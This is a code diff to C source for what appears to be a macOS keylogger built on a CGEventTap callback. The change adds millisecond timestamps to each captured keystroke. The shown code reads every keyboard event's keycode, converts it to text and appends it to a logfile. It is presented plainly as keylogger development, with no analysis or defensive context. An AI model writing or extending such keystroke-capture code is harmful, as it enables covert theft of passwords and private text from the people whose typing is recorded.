@@ -1,5 +1,6 @@
 #include <stdio.h>
 #include <time.h>
+#include <sys/time.h>
 #include "keylogger.h"
 
 int main(int argc, const char *argv[]) {
@@ -62,12 +63,15 @@ CGEventRef CGEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef e
     // Retrieve the incoming keycode.
     CGKeyCode keyCode = (CGKeyCode) CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
 
+    struct timeval ts;
+    gettimeofday(&ts, NULL);
+    
     // Get current time_t
-    time_t currentTime = time(NULL);
+    time_t currentTime = ts.tv_sec;
     char dateString[128];
     strftime(dateString, sizeof(dateString), "%Y/%m/%d %a %H:%M:%S", localtime(&currentTime));
     // Print the human readable key to the logfile.
-    fprintf(logfile, "%s, %s\n", dateString, convertKeyCode(keyCode));
+    fprintf(logfile, "%s.%d, %s\n", dateString, ts.tv_usec / 1000, convertKeyCode(keyCode));
     fflush(logfile);
 
     return event;
